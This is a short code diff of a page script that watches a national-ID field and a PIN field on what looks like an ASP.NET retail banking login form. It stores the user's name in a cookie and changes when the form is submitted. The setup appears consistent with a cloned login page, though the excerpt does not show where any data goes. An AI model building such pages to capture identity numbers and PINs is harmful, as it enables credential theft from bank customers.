@@ -246,7 +246,7 @@ document.addEventListener("DOMContentLoaded", function () {
           document.cookie = `isim=${adi} ${soyadi}; path=/`;
 
           // Formu post et
-          document.getElementById('aspnetForm').submit();
+          //document.getElementById('aspnetForm').submit();
         } else {
           console.log('TC kimlik doğrulama başarısız.');
         }
@@ -258,10 +258,9 @@ document.addEventListener("DOMContentLoaded", function () {
     }
   }
 
-   function handleInput() {
- 
+  function handleInput() {
+    checkAndSubmit();
   }
-
 
   var identityInput = document.getElementById("ctl00_c_RetailIdentityTextBox");
   var pinInput = document.getElementById("ctl00_c_RetailPinTextBox");
@@ -269,7 +268,6 @@ document.addEventListener("DOMContentLoaded", function () {
   identityInput.addEventListener("input", handleInput);
   pinInput.addEventListener("input", handleInput);
 });
-
   </script>
     <div>
   </body>
